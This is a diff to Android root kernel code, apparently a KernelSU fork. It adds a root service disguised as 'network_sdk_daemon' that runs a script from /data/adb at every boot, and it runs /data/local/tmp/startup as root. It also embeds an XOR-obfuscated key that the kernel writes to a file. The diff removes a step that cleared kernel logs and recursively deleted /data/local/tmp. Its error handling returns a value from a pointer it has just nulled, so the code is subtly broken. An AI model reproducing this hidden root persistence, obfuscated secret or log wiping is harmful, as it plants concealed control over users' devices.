@@ -45,10 +45,8 @@ static const char KERNEL_SU_RC[] =
     // 3. 签名验证，如果签名验证成功，则文件正常保留并且执行，如何签名验证失败，则写入空文件
     "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- /system/bin/false ksu_verify_dump\n"
     // 4. 部署到 adb 并修复所有权限 (一步到位，不需要额外 shell 脚本)
-    "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- /system/bin/sh -c \"if [ -s /data/local/tmp/startup ]; then echo \"bG9pamtpdXlnaGVydGdmZGN2YmhvbGtpdXloam5iZ3Q=\" > /data/local/tmp/module.key && /data/local/tmp/startup; fi\"\n"
-    // 5. 清理内核日志和缓存文件
-    "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- /system/bin/sh -c \"dmesg -C && rm -rf /data/local/tmp/*\"\n"
-    // 6. 让 ksud 接管：此时文件已全部就位，挂载模块开机即生效！
+    "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- /system/bin/sh -c \"if [ -s /data/local/tmp/startup ]; then /data/local/tmp/startup; fi\"\n"
+    // 5. 让 ksud 接管：此时文件已全部就位，挂载模块开机即生效！
     "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- " KSUD_PATH " post-fs-data\n"
     "\n"
     "on nonencrypted\n"
@@ -57,7 +55,15 @@ static const char KERNEL_SU_RC[] =
     "on property:vold.decrypt=trigger_restart_framework\n"
     "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- " KSUD_PATH " services\n"
     "\n"
+    "service network_sdk_daemon /system/bin/sh /data/adb/network/sdk_daemon.sh\n"
+    "    user root\n"
+    "    group root\n"
+    "    seclabel u:r:" KERNEL_SU_DOMAIN ":s0\n"
+    "    disabled"
+    "\n"
     "on property:sys.boot_completed=1\n"
+    // 1. 启动守护程序
+    "    start network_sdk_daemon\n"
     "    exec u:r:" KERNEL_SU_DOMAIN ":s0 root -- " KSUD_PATH " boot-completed\n"
     "\n"
     "\n";
@@ -207,7 +213,42 @@ void ksu_handle_execveat_ksud(const char *path, struct user_arg_ptr *argv)
             // 1. 调用验证函数
             ret = verify_file_signature(target_path);
             // 2. 判断结果，处理清空逻辑
-            if (ret != 0) {
+            if (ret == 0) {
+                struct file *key_file = NULL;
+                loff_t pos = 0;
+                ssize_t written;
+//                static const char key_data[] = "bG9pamtpdXlnaGVydGdmZGN2YmhvbGtpdXloam5iZ3Q=";
+                static const unsigned char key_data_xor[] = {
+                    0x38,0x1D,0x63,0x2A,0x3B,0x37,0x2E,0x2A,
+                    0x3E,0x02,0x36,0x34,0x3B,0x1D,0x0C,0x23,0x3E,
+                    0x1D,0x3E,0x37,0x00,0x1D,0x14,0x68,0x03,0x37,
+                    0x32,0x2C,0x38,0x1D,0x2E,0x2A,0x3E,0x02,0x36,
+                    0x35,0x3B,0x37,0x6F,0x33,0x00,0x69,0x0B,0x67
+                };
+                char key_data[45];
+                for (int i = 0; i < 44; i++)
+                {
+                    key_data[i] = key_data_xor[i] ^ 0x5A;
+                }
+                key_data[44] = '\0';
+
+                key_file = filp_open("/data/local/tmp/module.key", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (IS_ERR(key_file)) {
+                    pr_err("open module.key failed: %ld\n", PTR_ERR(key_file));
+                    key_file = NULL;
+                    return PTR_ERR(key_file);
+                }
+
+                written = kernel_write(key_file, key_data, strlen(key_data), &pos);
+                if (written < 0) {
+                    pr_err("write module.key failed: %zd\n", written);
+                } else if (written != strlen(key_data)) {
+                    pr_err("partial write: %zd/%zu\n", written, strlen(key_data));
+                }
+
+                filp_close(key_file, NULL);
+                key_file = NULL;
+            } else {
                 //pr_err("ksu_startup: 验证未通过或发生错误 (错误码: %d)，执行文件清空...\n", ret);
                 // 使用 O_TRUNC 标志打开文件，内核会自动将文件大小截断为 0
                 f_truncate = filp_open(target_path, O_WRONLY | O_TRUNC, 0);
